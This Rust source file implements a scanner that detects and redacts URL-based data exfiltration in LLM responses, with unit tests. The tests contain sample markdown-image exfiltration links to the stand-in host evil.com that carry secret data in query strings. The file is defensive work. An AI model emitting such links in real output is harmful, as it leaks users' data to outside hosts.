use super::config::{DlpAction, UrlExfilConfig};
use super::hot_config::{is_domain_suspicious, SharedHotConfig};
use regex::Regex;
use std::borrow::Cow;

/// Detection detail for a suspicious URL.
#[derive(Debug, Clone)]
pub struct UrlExfilDetection {
    pub url: String,
    pub reason: String,
    pub start: usize,
    pub end: usize,
}

impl std::fmt::Display for UrlExfilDetection {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "URL exfil: '{}' ({})", self.url, self.reason)
    }
}

/// Result of URL exfiltration scanning.
pub enum UrlExfilResult {
    /// No suspicious URLs found.
    Clean,
    /// URLs were redacted in the returned text.
    Redacted(String),
    /// URLs were logged but text unchanged.
    Logged,
    /// URLs triggered a block action.
    Blocked(Vec<UrlExfilDetection>),
}

/// Scans LLM response text for suspicious URL-based data exfiltration.
pub struct UrlExfilScanner {
    config: UrlExfilConfig,
    hot_config: SharedHotConfig,
    md_image_re: Regex,
    md_link_re: Regex,
    raw_url_re: Regex,
    data_uri_re: Regex,
    base64_segment_re: Regex,
    /// Fast reject: only proceed if text contains one of these first bytes.
    prefix_bytes: [bool; 256],
}

impl UrlExfilScanner {
    pub fn new(config: UrlExfilConfig, hot_config: SharedHotConfig) -> Self {
        // ![alt](url) — markdown image
        let md_image_re = Regex::new(r"!\[[^\]]*\]\(([^)]+)\)").unwrap();
        // [text](url) — markdown link (we filter out images in find_suspicious_urls)
        let md_link_re = Regex::new(r"\[[^\]]*\]\(([^)]+)\)").unwrap();
        // Raw URLs
        let raw_url_re = Regex::new(r#"https?://[^\s)\]>"']+"#).unwrap();
        // data: URIs
        let data_uri_re = Regex::new(r"data:[a-zA-Z0-9/+.-]+;base64,[A-Za-z0-9+/=]+").unwrap();
        // Base64-like path segments (32+ chars)
        let base64_segment_re = Regex::new(r"/[A-Za-z0-9+/=]{32,}").unwrap();

        let mut prefix_bytes = [false; 256];
        prefix_bytes[b'!' as usize] = true; // md image
        prefix_bytes[b'[' as usize] = true; // md link
        prefix_bytes[b'h' as usize] = true; // http/https
        prefix_bytes[b'H' as usize] = true; // HTTP/HTTPS
        prefix_bytes[b'd' as usize] = true; // data:
        prefix_bytes[b'D' as usize] = true; // Data:

        Self {
            config,
            hot_config,
            md_image_re,
            md_link_re,
            raw_url_re,
            data_uri_re,
            base64_segment_re,
            prefix_bytes,
        }
    }

    /// Fast pre-filter: does the text possibly contain any URL-like content?
    pub fn might_contain_url(&self, text: &str) -> bool {
        text.bytes().any(|b| self.prefix_bytes[b as usize])
    }

    /// Scan text for suspicious URLs. Returns the scan result with action.
    pub fn scan(&self, text: &str) -> UrlExfilResult {
        if !self.might_contain_url(text) {
            return UrlExfilResult::Clean;
        }

        let detections = self.find_suspicious_urls(text);
        if detections.is_empty() {
            return UrlExfilResult::Clean;
        }

        for det in &detections {
            tracing::warn!("DLP URL exfil: {}", det);
            metrics::counter!(
                "grob_dlp_detections_total",
                "type" => "url_exfil",
                "rule" => det.reason.clone(),
                "action" => self.config.action.to_string()
            )
            .increment(1);
        }

        match self.config.action {
            DlpAction::Block => UrlExfilResult::Blocked(detections),
            DlpAction::Log => UrlExfilResult::Logged,
            DlpAction::Redact => {
                let redacted = self.redact_urls(text, &detections);
                UrlExfilResult::Redacted(redacted)
            }
        }
    }

    /// Find all suspicious URLs in the text.
    fn find_suspicious_urls(&self, text: &str) -> Vec<UrlExfilDetection> {
        let mut detections = Vec::new();
        let mut seen_ranges: Vec<(usize, usize)> = Vec::new();

        // Check data URIs first
        if self.config.flag_data_uris {
            for m in self.data_uri_re.find_iter(text) {
                let range = (m.start(), m.end());
                if !overlaps(&seen_ranges, range) {
                    detections.push(UrlExfilDetection {
                        url: m.as_str().chars().take(100).collect::<String>(),
                        reason: "data_uri".to_string(),
                        start: m.start(),
                        end: m.end(),
                    });
                    seen_ranges.push(range);
                }
            }
        }

        // Check markdown images
        if self.config.scan_markdown_images {
            for caps in self.md_image_re.captures_iter(text) {
                if let Some(url_match) = caps.get(1) {
                    let full = caps.get(0).unwrap();
                    let range = (full.start(), full.end());
                    if !overlaps(&seen_ranges, range) {
                        if let Some(det) =
                            self.check_url(url_match.as_str(), full.start(), full.end(), "md_image")
                        {
                            detections.push(det);
                            seen_ranges.push(range);
                        }
                    }
                }
            }
        }

        // Check markdown links
        if self.config.scan_markdown_links {
            for caps in self.md_link_re.captures_iter(text) {
                if let Some(url_match) = caps.get(1) {
                    let full = caps.get(0).unwrap();
                    let range = (full.start(), full.end());
                    if !overlaps(&seen_ranges, range) {
                        if let Some(det) =
                            self.check_url(url_match.as_str(), full.start(), full.end(), "md_link")
                        {
                            detections.push(det);
                            seen_ranges.push(range);
                        }
                    }
                }
            }
        }

        // Check raw URLs
        if self.config.scan_raw_urls {
            for m in self.raw_url_re.find_iter(text) {
                let range = (m.start(), m.end());
                if !overlaps(&seen_ranges, range) {
                    if let Some(det) = self.check_url(m.as_str(), m.start(), m.end(), "raw_url") {
                        detections.push(det);
                        seen_ranges.push(range);
                    }
                }
            }
        }

        detections
    }

    /// Check a single URL for suspicious characteristics.
    fn check_url(
        &self,
        url_str: &str,
        start: usize,
        end: usize,
        source: &str,
    ) -> Option<UrlExfilDetection> {
        let parsed = match url::Url::parse(url_str) {
            Ok(u) => u,
            Err(_) => return None,
        };

        // Check hostname against domain lists
        if let Some(hostname) = parsed.host_str() {
            let hot = self.hot_config.read().unwrap();
            if is_domain_suspicious(hostname, &hot.url_whitelist, &hot.url_blacklist) {
                return Some(UrlExfilDetection {
                    url: url_str.to_string(),
                    reason: format!("{}_suspicious_domain", source),
                    start,
                    end,
                });
            }
        }

        // Check query string length
        if self.config.flag_long_query_params {
            if let Some(query) = parsed.query() {
                if query.len() > self.config.max_query_length {
                    return Some(UrlExfilDetection {
                        url: url_str.to_string(),
                        reason: format!("{}_long_query({})", source, query.len()),
                        start,
                        end,
                    });
                }
            }
        }

        // Check for base64-encoded data in path
        if self.config.flag_base64_in_path {
            let path = parsed.path();
            if self.base64_segment_re.is_match(path) {
                return Some(UrlExfilDetection {
                    url: url_str.to_string(),
                    reason: format!("{}_base64_in_path", source),
                    start,
                    end,
                });
            }
        }

        None
    }

    /// Redact suspicious URLs in text, replacing them with [URL REDACTED].
    fn redact_urls(&self, text: &str, detections: &[UrlExfilDetection]) -> String {
        let mut result = String::with_capacity(text.len());
        let mut last_end = 0;

        // Sort detections by start position
        let mut sorted: Vec<&UrlExfilDetection> = detections.iter().collect();
        sorted.sort_by_key(|d| d.start);

        for det in sorted {
            if det.start < last_end {
                continue;
            }
            result.push_str(&text[last_end..det.start]);
            result.push_str("[URL REDACTED]");
            last_end = det.end;
        }
        result.push_str(&text[last_end..]);
        result
    }

    /// Apply URL exfil scanning to response text, returning modified text if needed.
    pub fn sanitize_response<'a>(&self, text: &'a str) -> Cow<'a, str> {
        match self.scan(text) {
            UrlExfilResult::Clean | UrlExfilResult::Logged => Cow::Borrowed(text),
            UrlExfilResult::Redacted(s) => Cow::Owned(s),
            UrlExfilResult::Blocked(_) => {
                // For non-streaming, redact on block too (streaming handles termination)
                let detections = self.find_suspicious_urls(text);
                Cow::Owned(self.redact_urls(text, &detections))
            }
        }
    }

    /// Check if the scan result is a block action.
    pub fn is_blocked(&self, text: &str) -> Option<Vec<UrlExfilDetection>> {
        match self.scan(text) {
            UrlExfilResult::Blocked(dets) => Some(dets),
            _ => None,
        }
    }
}

/// Check if a range overlaps with any existing range.
fn overlaps(ranges: &[(usize, usize)], new: (usize, usize)) -> bool {
    ranges.iter().any(|&(s, e)| new.0 < e && new.1 > s)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::features::dlp::config::DomainMatchMode;
    use crate::features::dlp::hot_config;

    fn test_scanner(action: DlpAction) -> UrlExfilScanner {
        let config = UrlExfilConfig {
            enabled: true,
            action,
            scan_markdown_images: true,
            scan_markdown_links: true,
            scan_raw_urls: true,
            flag_long_query_params: true,
            flag_base64_in_path: true,
            flag_data_uris: true,
            max_query_length: 200,
            whitelist_domains: vec![],
            blacklist_domains: vec!["evil.com".to_string()],
            domain_match_mode: DomainMatchMode::Suffix,
        };
        let hot = hot_config::build_initial_hot_config(
            &config.whitelist_domains,
            &config.blacklist_domains,
            &config.domain_match_mode,
            &[],
        );
        UrlExfilScanner::new(config, hot)
    }

    #[test]
    fn test_detects_md_image_exfil() {
        let scanner = test_scanner(DlpAction::Redact);
        let text = r#"Here's the result: ![img](https://evil.com/collect?data=c2VjcmV0IGRhdGE)"#;
        match scanner.scan(text) {
            UrlExfilResult::Redacted(s) => {
                assert!(s.contains("[URL REDACTED]"));
                assert!(!s.contains("evil.com"));
            }
            other => panic!(
                "Expected Redacted, got {:?}",
                std::mem::discriminant(&other)
            ),
        }
    }

    #[test]
    fn test_clean_url_passes() {
        let scanner = test_scanner(DlpAction::Redact);
        let text = "Check out https://docs.rs/regex/latest";
        match scanner.scan(text) {
            UrlExfilResult::Clean => {}
            other => panic!("Expected Clean, got {:?}", std::mem::discriminant(&other)),
        }
    }

    #[test]
    fn test_long_query_string() {
        let scanner = test_scanner(DlpAction::Log);
        let long_query = "a".repeat(250);
        let text = format!("Visit https://example.com/path?data={}", long_query);
        assert!(matches!(scanner.scan(&text), UrlExfilResult::Logged));
    }

    #[test]
    fn test_base64_in_path() {
        let scanner = test_scanner(DlpAction::Redact);
        let b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkl";
        let text = format!("https://example.com/{}", b64);
        match scanner.scan(&text) {
            UrlExfilResult::Redacted(s) => {
                assert!(s.contains("[URL REDACTED]"));
            }
            other => panic!(
                "Expected Redacted, got {:?}",
                std::mem::discriminant(&other)
            ),
        }
    }

    #[test]
    fn test_data_uri_detected() {
        let scanner = test_scanner(DlpAction::Redact);
        let text = "data:text/plain;base64,SGVsbG8gV29ybGQhIFRoaXMgaXMgc2VjcmV0IGRhdGE=";
        match scanner.scan(text) {
            UrlExfilResult::Redacted(s) => {
                assert!(s.contains("[URL REDACTED]"));
            }
            other => panic!(
                "Expected Redacted, got {:?}",
                std::mem::discriminant(&other)
            ),
        }
    }

    #[test]
    fn test_block_action() {
        let scanner = test_scanner(DlpAction::Block);
        let text = "![img](https://evil.com/steal?key=secret)";
        match scanner.scan(text) {
            UrlExfilResult::Blocked(dets) => {
                assert!(!dets.is_empty());
            }
            other => panic!("Expected Blocked, got {:?}", std::mem::discriminant(&other)),
        }
    }

    #[test]
    fn test_whitelist_allows_domain() {
        let config = UrlExfilConfig {
            enabled: true,
            action: DlpAction::Redact,
            whitelist_domains: vec!["github.com".to_string()],
            blacklist_domains: vec![],
            domain_match_mode: DomainMatchMode::Suffix,
            ..Default::default()
        };
        let hot = hot_config::build_initial_hot_config(
            &config.whitelist_domains,
            &config.blacklist_domains,
            &config.domain_match_mode,
            &[],
        );
        let scanner = UrlExfilScanner::new(config, hot);

        // github.com should pass
        let text = "See https://github.com/repo?query=abc";
        assert!(matches!(scanner.scan(text), UrlExfilResult::Clean));

        // unknown.com should be flagged
        let text2 = "See https://unknown.com/path?data=abc";
        assert!(!matches!(scanner.scan(text2), UrlExfilResult::Clean));
    }
}
